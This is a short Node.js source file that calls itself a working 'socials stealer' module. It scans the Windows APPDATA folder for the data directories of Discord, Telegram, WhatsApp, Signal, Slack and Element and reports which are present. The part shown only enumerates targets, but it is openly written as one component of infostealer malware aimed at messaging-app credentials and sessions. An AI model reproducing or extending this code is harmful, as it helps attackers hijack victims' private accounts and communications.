// socials-stealer.js - Fixed & Working
const fs = require('fs/promises');
const path = require('path');

const socialPaths = {
    Discord:        'Discord',
    DiscordCanary:  'discordcanary',
    DiscordPTB:     'discordptb',
    Telegram:       'Telegram Desktop',
    WhatsApp:       'WhatsApp',
    Signal:         'Signal',
    Slack:          'Slack',
    Element:        'Element'
};

module.exports = async () => {
    try {
        console.log("[+] Socials stealer started...");

        const roaming = process.env.APPDATA;
        const found = [];

        for (const [name, folder] of Object.entries(socialPaths)) {
            const fullPath = path.join(roaming, folder);

            try {
                await fs.access(fullPath);
                found.push({
                    app: name,
                    path: fullPath
                });
                console.log(`[+] Found ${name}`);
            } catch (e) {
                // Folder doesn't exist, skip silently
            }
        }

        console.log(`[+] Socials stealer found ${found.length} apps`);

        return {
            count: found.length,
            apps: found
        };

    } catch (e) {
        console.log("[-] Socials stealer error:", e.message);
        return {
            count: 0,
            apps: [],
            error: e.message
        };
    }
};

